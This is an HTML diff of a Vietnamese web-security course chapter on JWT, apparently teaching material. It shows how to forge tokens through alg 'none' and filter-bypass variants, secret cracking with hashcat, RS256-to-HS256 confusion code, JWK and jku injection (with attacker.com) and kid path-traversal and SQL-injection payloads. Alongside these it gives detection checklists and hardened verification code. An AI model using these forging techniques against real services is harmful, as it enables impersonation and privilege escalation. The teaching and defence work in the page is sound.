@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 8: JWT — Hieu Nguyen</title>
-  <meta name="description" content="JWT structure, alg pinning, secret, TTL, gateway validation.">
+  <title>Chương 8: JWT — JSON Web Token — Hieu Nguyen</title>
+  <meta name="description" content="Chương 8: JWT — JSON Web Token — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,55 +40,334 @@
         <span>›</span>
         <span>08. JWT</span>
       </div>
-      <h1>Chương 8: JWT</h1>
-      <p class="lede">JWT tiện vì stateless. Tiện đó cũng là chỗ revoke và thuật toán bị làm ẩu.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> II — Auth</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>JWT: header.payload.signature (Base64URL). Payload đọc được — không mã hóa. Chữ ký mới là control.</p>
-<h2 id="cau-truc">Cấu trúc</h2>
-<p>Header: alg, typ, kid. Payload: sub, exp, iss, aud, role… Signature: HMAC hoặc RSA/ECDSA. Decode trên lab để đọc claim; đổi claim mà không ký lại thì gateway phải reject.</p>
-<h2 id="lo-hong">Lớp bug thư viện / config</h2>
-<ul>
-        <li>Tin <code>alg</code> từ token (none / nhầm RS↔HS).</li>
-        <li>Secret HMAC yếu hoặc default.</li>
-        <li>Nhận JWK/jku/kid từ attacker (SSRF + key confuse).</li>
-        <li>TTL dài, không <code>exp</code>, không check <code>aud</code>.</li>
-      </ul>
-<blockquote>Phòng: pin algorithm trên server, lấy key từ JWKS nội bộ allowlist, không từ header token.</blockquote>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Verify chữ ký với key cố định / JWKS tin cậy.</li>
-        <li>TTL ngắn; refresh rotate.</li>
-        <li>Không nhét PII/secret vào payload.</li>
-        <li>Denylist <code>jti</code> khi logout nếu cần cắt ngay.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>API gateway (Kong, Istio JWT, Cloud Armor) verify iss/aud/exp. JWKS cache + rotation. Log <code>sub</code> không log raw token.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Payload không bí mật.</li>
-        <li>Pin alg + key.</li>
-        <li>exp/aud/iss bắt buộc.</li>
-        <li>Gateway verify một nơi.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>JWT khác session cookie chỗ revoke?</li>
-        <li>Vì sao không tin alg trên token?</li>
-        <li>kid nguy hiểm khi nào?</li>
-        <li>Claim nào gateway nên bắt?</li>
-        <li>Access token sống 24h thì trade-off gì?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 8: JWT — JSON Web Token</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>JWT</strong> (JSON Web Token — Token Web dạng JSON) là chuẩn mở (RFC 7519) để truyền thông tin giữa các bên dưới dạng JSON object được ký số. JWT thường dùng thay thế server-side session để authentication stateless.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Cao — JWT implementation lỗi cho phép hacker giả mạo identity hoặc leo thang đặc quyền.</p>
+<hr>
+<h2 id="cấu-trúc-jwt">Cấu trúc JWT</h2>
+<pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEzMzcsInJvbGUiOiJ1c2VyIn0.abc123
+│──────────────────────────────────────│ │──────────────────────────────────────│ │─────│
+                Header                                  Payload                    Signature
+</code></pre>
+<p>Ba phần, ngăn cách bằng dấu chấm, mỗi phần là Base64URL encoded.</p>
+<p><strong>Header:</strong></p>
+<pre><code class="language-json">{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+}
+</code></pre>
+<p><strong>Payload (Claims):</strong></p>
+<pre><code class="language-json">{
+  &quot;sub&quot;: &quot;1337&quot;,
+  &quot;username&quot;: &quot;alice&quot;,
+  &quot;role&quot;: &quot;user&quot;,
+  &quot;iat&quot;: 1609459200,
+  &quot;exp&quot;: 1609462800
+}
+</code></pre>
+<p><strong>Signature:</strong></p>
+<pre><code class="language-text">HMACSHA256(
+  base64url(header) + &quot;.&quot; + base64url(payload),
+  secret_key
+)
+</code></pre>
+<blockquote>
+<p><strong>Quan trọng:</strong> JWT được <strong>ký số</strong> (signed), không phải <strong>mã hóa</strong> (encrypted). Header và payload có thể đọc được bởi bất kỳ ai có token. Đừng để sensitive data trong payload trừ khi dùng JWE.</p>
+</blockquote>
+<hr>
+<h2 id="decode-jwt">Decode JWT</h2>
+<pre><code class="language-bash"># Decode nhanh bằng base64
+echo &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&quot; | base64 -d
+# Output: {&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}
 
-      <div class="docs-tags">
-        <span class="docs-tag">jwt</span>
-        <span class="docs-tag">oidc</span>
-        <span class="docs-tag">tokens</span>
-      </div>
+# Dùng jwt.io (online) hoặc:
+pip install PyJWT
+python3 -c &quot;import jwt; print(jwt.decode(&#x27;TOKEN&#x27;, options={&#x27;verify_signature&#x27;: False}))&quot;
+</code></pre>
+<hr>
+<h2 id="các-lỗ-hổng-jwt">Các lỗ hổng JWT</h2>
+<h3 id="1-algorithm-none-attack">1. Algorithm: None Attack</h3>
+<p>Thuật toán <code>none</code> chỉ định &quot;không cần signature&quot;. JWT với <code>alg: none</code> không cần ký, bất kỳ payload nào cũng được accept.</p>
+<pre><code class="language-python"># Tạo JWT với alg: none
+header = base64url({&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;})
+payload = base64url({&quot;userId&quot;: 1, &quot;role&quot;: &quot;admin&quot;})
+signature = &quot;&quot;  # Không có signature
+
+token = f&quot;{header}.{payload}.&quot;
+</code></pre>
+<p><strong>Bypass filter:</strong></p>
+<pre><code class="language-text">Nếu server check &quot;alg&quot; != &quot;none&quot; (case-sensitive):
+→ Thử: &quot;None&quot;, &quot;NONE&quot;, &quot;nOnE&quot;, &quot;NoNe&quot;
+→ Một số libraries accept các biến thể này
+</code></pre>
+<p><strong>Lab PortSwigger:</strong> Dùng Burp JWT Editor extension:</p>
+<ol>
+<li>Intercept request với JWT</li>
+<li>JWT Editor → Edit payload: role=admin</li>
+<li>Attack → None signing algorithm</li>
+<li>Forward request</li>
+</ol>
+<h3 id="2-weak-secret--brute-force">2. Weak Secret — Brute Force</h3>
+<p>HMAC algorithms (HS256/HS384/HS512) dùng symmetric key. Nếu key yếu, có thể brute force.</p>
+<pre><code class="language-bash"># Brute force JWT secret bằng hashcat
+hashcat -a 0 -m 16500 \
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEzMzd9.abc123 \
+  /usr/share/wordlists/rockyou.txt
+
+# Hoặc dùng jwt-cracker
+npm install -g jwt-cracker
+jwt-cracker eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.hash &quot;secret&quot;
+
+# Secret phổ biến bị tìm thấy:
+# &quot;secret&quot;, &quot;password&quot;, &quot;key&quot;, &quot;jwt_secret&quot;, &quot;your-256-bit-secret&quot;
+</code></pre>
+<p>Sau khi có secret, ký lại JWT với bất kỳ payload nào:</p>
+<pre><code class="language-python">import jwt
+secret = &quot;secret&quot;
+fake_token = jwt.encode(
+    {&quot;userId&quot;: 1, &quot;role&quot;: &quot;admin&quot;},
+    secret,
+    algorithm=&quot;HS256&quot;
+)
+</code></pre>
+<h3 id="3-algorithm-confusion-rs256--hs256">3. Algorithm Confusion (RS256 → HS256)</h3>
+<p>Đây là tấn công tinh vi nhất với JWT.</p>
+<p><strong>Background:</strong></p>
+<ul>
+<li>RS256: Dùng private key để ký, public key để verify (asymmetric)</li>
+<li>HS256: Dùng cùng secret key để ký và verify (symmetric)</li>
+</ul>
+<pre><code class="language-text">Server:
+- Tạo token: ký bằng RSA private key (RS256)
+- Verify token: dùng RSA public key
+
+Library API:
+verify(token, key):
+    alg = token.header.alg
+    if alg == &quot;RS256&quot;:
+        verify_rsa(token, key)  # key = public key
+    elif alg == &quot;HS256&quot;:
+        verify_hmac(token, key)  # key = secret
+</code></pre>
+<p><strong>Attack:</strong></p>
+<pre><code class="language-text">1. Lấy public key của server (thường exposed tại /jwks.json hoặc /.well-known/jwks.json)
+2. Tạo JWT mới với:
+   - alg: HS256 (thay vì RS256)
+   - Payload: role=admin
+3. Ký JWT bằng public key như thể nó là HMAC secret
+4. Server nhận token:
+   - Thấy alg=HS256
+   - Verify bằng HS256 với... public key (vì đó là &quot;key&quot; được cấu hình)
+   - Public key = secret trong HMAC context
+   → Verify thành công! Hacker đã forge token
+</code></pre>
+<pre><code class="language-python"># Algorithm confusion attack
+import jwt
+from cryptography.hazmat.primitives import serialization
+
+# 1. Get public key từ /jwks.json
+public_key = load_public_key_from_jwks()
+
+# 2. Convert sang PEM format
+public_key_pem = public_key.public_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+
+# 3. Sign với HS256 dùng public key làm secret
+forged_token = jwt.encode(
+    {&quot;userId&quot;: 1, &quot;role&quot;: &quot;admin&quot;},
+    public_key_pem,  # public key làm HMAC secret!
+    algorithm=&quot;HS256&quot;
+)
+</code></pre>
+<h3 id="4-jwk-header-injection">4. JWK Header Injection</h3>
+<p>JWT header có thể chứa <code>jwk</code> (JSON Web Key) — key dùng để verify chính token đó.</p>
+<pre><code class="language-json">{
+  &quot;alg&quot;: &quot;RS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;jwk&quot;: {
+    &quot;kty&quot;: &quot;RSA&quot;,
+    &quot;e&quot;: &quot;AQAB&quot;,
+    &quot;kid&quot;: &quot;attacker-key&quot;,
+    &quot;n&quot;: &quot;ATTACKER_PUBLIC_KEY_MODULUS&quot;
+  }
+}
+</code></pre>
+<p><strong>Attack:</strong></p>
+<pre><code class="language-text">1. Hacker generate cặp RSA key mới
+2. Tạo JWT với:
+   - Header: jwk = hacker&#x27;s public key
+   - Payload: role=admin
+   - Signed với hacker&#x27;s private key
+3. Server nhận token:
+   - Đọc jwk từ header
+   - Verify signature dùng key trong jwk
+   - Hacker&#x27;s private key → hacker&#x27;s public key → verify thành công!
+
+→ Server verify token do hacker tạo mà không biết đây là tấn công
+</code></pre>
+<p>Dùng Burp JWT Editor:</p>
+<ol>
+<li>Generate RSA key pair</li>
+<li>Attack → Embedded JWK</li>
+<li>Modify payload</li>
+<li>Sign với private key</li>
+</ol>
+<h3 id="5-jku-jwk-set-url-injection">5. jku (JWK Set URL) Injection</h3>
+<pre><code class="language-json">{
+  &quot;alg&quot;: &quot;RS256&quot;,
+  &quot;jku&quot;: &quot;https://attacker.com/jwks.json&quot;
+}
+</code></pre>
+<p>Server fetch public key từ URL trong header để verify. Nếu server không validate URL:</p>
+<pre><code class="language-text">1. Hacker host jwks.json trên server của hắn với public key của hắn
+2. Tạo JWT với jku trỏ đến server của hắn
+3. Server fetch key → verify → thành công!
+</code></pre>
+<h3 id="6-kid-key-id-injection">6. kid (Key ID) Injection</h3>
+<p><code>kid</code> parameter chỉ định key nào được dùng để verify. Nếu server dùng <code>kid</code> để lookup file hoặc database:</p>
+<p><strong>Path Traversal:</strong></p>
+<pre><code class="language-json">{
+  &quot;kid&quot;: &quot;../../dev/null&quot;
+}
+</code></pre>
+<p>Server verify với empty secret → bypass nếu server sign payload với empty secret.</p>
+<p><strong>SQL Injection:</strong></p>
+<pre><code class="language-json">{
+  &quot;kid&quot;: &quot;&#x27; UNION SELECT &#x27;attacker_secret&#x27;-- -&quot;
+}
+</code></pre>
+<p>Server query DB với kid → trả về attacker&#x27;s secret → server verify với attacker&#x27;s secret → hacker sign với secret đó → thành công.</p>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Decode JWT header: alg là gì?
+□ Thử alg: none/None/NONE → server có reject không?
+□ /jwks.json hoặc /.well-known/jwks.json public key có exposed không?
+□ Brute force secret (với HS256)
+□ Server có jwks.json endpoint không → algorithm confusion risk
+□ kid parameter có validate không?
+□ Token không expire (thiếu exp claim)?
+□ Sensitive data trong payload (password, PII)?
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<pre><code class="language-python"># Python với PyJWT — đúng cách
+
+import jwt
+from jwt.exceptions import InvalidTokenError
+
+# 1. Luôn specify algorithms rõ ràng
+def verify_token(token: str) -&gt; dict:
+    try:
+        payload = jwt.decode(
+            token,
+            key=settings.JWT_PUBLIC_KEY,  # hoặc secret
+            algorithms=[&quot;RS256&quot;],  # Whitelist, không cho &quot;none&quot;
+            options={
+                &quot;require&quot;: [&quot;exp&quot;, &quot;iat&quot;, &quot;sub&quot;],  # Required claims
+                &quot;verify_exp&quot;: True,
+                &quot;verify_iat&quot;: True,
+            }
+        )
+        return payload
+    except InvalidTokenError as e:
+        raise AuthenticationError(f&quot;Invalid token: {e}&quot;)
+
+# 2. Tạo token an toàn
+def create_token(user_id: int) -&gt; str:
+    payload = {
+        &quot;sub&quot;: str(user_id),
+        &quot;iat&quot;: datetime.utcnow(),
+        &quot;exp&quot;: datetime.utcnow() + timedelta(hours=1),
+        &quot;jti&quot;: secrets.token_urlsafe(16),  # JWT ID để prevent reuse
+    }
+    return jwt.encode(payload, settings.JWT_PRIVATE_KEY, algorithm=&quot;RS256&quot;)
+
+# 3. Token rotation và revocation
+class TokenBlacklist:
+    def __init__(self, redis):
+        self.redis = redis
+    
+    def revoke(self, jti: str, exp: int):
+        ttl = exp - int(time.time())
+        if ttl &gt; 0:
+            self.redis.setex(f&quot;revoked:{jti}&quot;, ttl, &quot;1&quot;)
+    
+    def is_revoked(self, jti: str) -&gt; bool:
+        return self.redis.exists(f&quot;revoked:{jti}&quot;)
+</code></pre>
+<p><strong>Secret Management:</strong></p>
+<pre><code class="language-bash"># JWT secret phải đủ mạnh
+# HS256 cần ít nhất 256-bit key
+openssl rand -hex 64  # 512-bit hex string
+
+# RS256 cần key pair
+openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem
+
+# Lưu trong Vault hoặc K8s Secret
+kubectl create secret generic jwt-keys \
+  --from-file=private.pem \
+  --from-file=public.pem
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>JWT Validation ở API Gateway:</strong></p>
+<pre><code class="language-yaml"># Kong Gateway: validate JWT
+plugins:
+  - name: jwt
+    config:
+      key_claim_name: kid
+      claims_to_verify:
+        - exp
+      secret_is_base64: false
+      # Chỉ allow specific algorithms
+      algorithms:
+        - RS256
+</code></pre>
+<p><strong>Monitoring JWT anomalies:</strong></p>
+<pre><code class="language-python"># Log và alert khi detect suspicious JWT usage
+def log_jwt_validation(token_payload: dict, request):
+    event = {
+        &quot;sub&quot;: token_payload.get(&quot;sub&quot;),
+        &quot;iat&quot;: token_payload.get(&quot;iat&quot;),
+        &quot;exp&quot;: token_payload.get(&quot;exp&quot;),
+        &quot;ip&quot;: request.remote_addr,
+        &quot;user_agent&quot;: request.user_agent.string
+    }
+    
+    # Alert: token dùng sau khi logout (revoked)
+    if is_revoked(token_payload.get(&quot;jti&quot;)):
+        alert(&quot;Revoked token usage attempt&quot;, event)
+    
+    # Alert: token từ unexpected IP (nếu có IP binding)
+    if token_payload.get(&quot;ip&quot;) != request.remote_addr:
+        alert(&quot;JWT used from different IP&quot;, event)
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>JWT là signed, không phải encrypted — đừng để secret data trong payload.</li>
+<li><code>alg: none</code> attack: disable bằng cách whitelist algorithms.</li>
+<li>Weak secret: dùng ít nhất 256-bit random secret hoặc RSA 2048+.</li>
+<li>Algorithm confusion: server phải verify algorithm match expected.</li>
+<li>JWK/jku injection: không trust key từ token header.</li>
+<li>kid injection: validate và sanitize kid parameter.</li>
+<li>Dùng <code>exp</code> và <code>jti</code> để limit token lifetime và enable revocation.</li>
+<li>Prefer RS256 (asymmetric) hơn HS256 (symmetric) cho microservices.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Tại sao JWT được gọi là &quot;signed&quot; chứ không phải &quot;encrypted&quot;? Implication là gì?</li>
+<li>Algorithm confusion attack (RS256 → HS256) hoạt động như thế nào?</li>
+<li>Làm thế nào để revoke JWT trước khi nó expire tự nhiên?</li>
+<li>jku injection khác jwk injection ở điểm nào?</li>
+<li>Khi nào nên dùng RS256 thay vì HS256?</li>
+</ol>
       <div class="docs-pager">
         <a href="../07/">Previous · 07. OAuth</a>
         <a href="../09/">Next · 09. CORS</a>
@@ -97,13 +376,21 @@
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#cau-truc">Cấu trúc</a>
-        <a href="#lo-hong">Lớp bug thư viện / config</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#cấu-trúc-jwt">Cấu trúc JWT</a>
+        <a href="#decode-jwt">Decode JWT</a>
+        <a href="#các-lỗ-hổng-jwt">Các lỗ hổng JWT</a>
+        <a class="depth-3" href="#1-algorithm-none-attack">1. Algorithm: None Attack</a>
+        <a class="depth-3" href="#2-weak-secret--brute-force">2. Weak Secret — Brute Force</a>
+        <a class="depth-3" href="#3-algorithm-confusion-rs256--hs256">3. Algorithm Confusion (RS256 → HS256)</a>
+        <a class="depth-3" href="#4-jwk-header-injection">4. JWK Header Injection</a>
+        <a class="depth-3" href="#5-jku-jwk-set-url-injection">5. jku (JWK Set URL) Injection</a>
+        <a class="depth-3" href="#6-kid-key-id-injection">6. kid (Key ID) Injection</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
